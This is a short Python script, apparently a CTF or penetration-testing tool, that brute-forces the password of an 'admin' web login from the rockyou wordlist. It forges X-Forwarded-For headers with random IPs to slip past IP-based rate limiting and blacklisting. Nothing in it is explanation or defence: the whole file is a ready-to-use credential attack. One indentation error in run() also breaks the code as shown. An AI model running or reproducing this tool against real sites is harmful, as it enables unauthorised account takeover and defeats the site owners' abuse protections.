from random import randint

import requests


# Brute force information
# The `RATE_LIMIT` value should be the number of requests after
# which an IP address is blacklisted. 

PASSWORD_LIST = '/usr/share/wordlists/rockyou.txt'  # Bruteforce list
RATE_LIMIT = 5
RATE_LIMIT_ERROR = 'Blacklist protection'
LOGIN_FAILED_ERROR = 'Incorrect username or password.'

# Target information
RHOST = ''                                        # Remote host's IP
LOGIN_PAGE = ''                                   # Login page URI
TARGET_URL = f'http://{RHOST}{LOGIN_PAGE}'        
USERNAME = 'admin'                                # Username to bruteforce
used_ips = []                                     

def attempt_login(password: str, ip: str) -> bool:
    """Performs a login using a given password.
    :param password: The password to try.
    :param ip: Spoof the attacker's IP address with this one.
    :return: True if the login was successful, otherwise False.
    """
    headers = {'X-Forwarded-For': ip}
    payload = {'username': USERNAME, 'password': password}
    r = requests.post(TARGET_URL, headers=headers, data=payload)

    if r.status_code == 500:
        print("Internal server error, aborting!")
        exit(1)

    if RATE_LIMIT_ERROR in r.text:
        print("Rate limit hit, aborting!")
        exit(1)

    return LOGIN_FAILED_ERROR not in r.text


def random_ip() -> str:
    """Generate a random IP address.
    :return: A random IP address.
    """
    ip = ".".join(str(randint(0, 255)) for _ in range(4))
    while ip in used_ips:
      ip = ".".join(str(randint(0, 255)) for _ in range(4))
    used_ips.append(ip)
    return ip


def run(start_at: int = 1):
    """Start the brute force process.
    :param start_at: Start brute forcing at the password with this 1-based index.
     The number represents the line in the password file. This is handy if the
     program was stopped during a previous attempt, allowing the user to resume
     the attack.
    """
    if RHOST == '' or  LOGIN_PAGE == '':
       print(f"edit RHOST and LOGIN PAGE")
        exit(1)
    ip: str = random_ip()
    num_attempts: int = 1

    for password in open(PASSWORD_LIST):
        if num_attempts < start_at:
            num_attempts += 1
            continue

        if num_attempts % (RATE_LIMIT - 1) == 0:
            ip = random_ip()

        password = password.strip()
        print(f"Attempt {num_attempts}: {ip}\t\t{password}")

        if attempt_login(password, ip):
            print(f"Password for {USERNAME} is {password}")
            break
        
        num_attempts += 1

        
if __name__ == '__main__':
    run()
